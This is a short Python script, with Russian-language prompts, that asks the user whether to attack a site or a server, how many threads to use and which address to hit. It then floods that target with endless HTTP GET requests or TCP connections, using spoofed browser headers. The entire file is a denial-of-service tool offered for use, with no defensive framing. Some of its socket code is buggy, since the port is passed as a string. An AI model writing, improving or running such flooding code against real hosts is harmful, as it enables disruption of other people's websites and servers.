import requests
import socket
from threading import Thread

type = int(input("Куда производится атака?\n1. Сайт\n2. Сервер \nОтвет: "))
thr = int(input("Кол-во потоков: "))
ip = input("Введите айпи и порт \nПример: 87.12.31.69:8080\nКуда слать запросы: ")

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/11020',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua-platform': 'FuckYouOS',
    'sec-ch-ua': 'Not A;Brand";v="99", "None";v="98", "Safari";v="84'
    }

def dos(ip):
    a = 1
    while a==1:
        try:
            resp = requests.get(ip, headers=headers)
            print(resp.status_code)
        except Exception:
            print('Ошибка кода!')

def dosserv(ipaddr, port):
    b = 1
    while b==1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ipaddr, port))
        s.sendall(b'ping your site')
        data = s.recv(1024)
        s.close()
        print('Полученные данные:', repr(data))
    
if type == 1:
    for i in range(thr):
        th = Thread(target=dos, args=(ip, ))
        th.start()

if type == 2:
    ipaddr = f'{ip.split(":")[0]}'
    port = ip.split(":")[1]
    for i in range(thr):
        th = Thread(target=dosserv, args=(ipaddr, port, ))
        th.start()
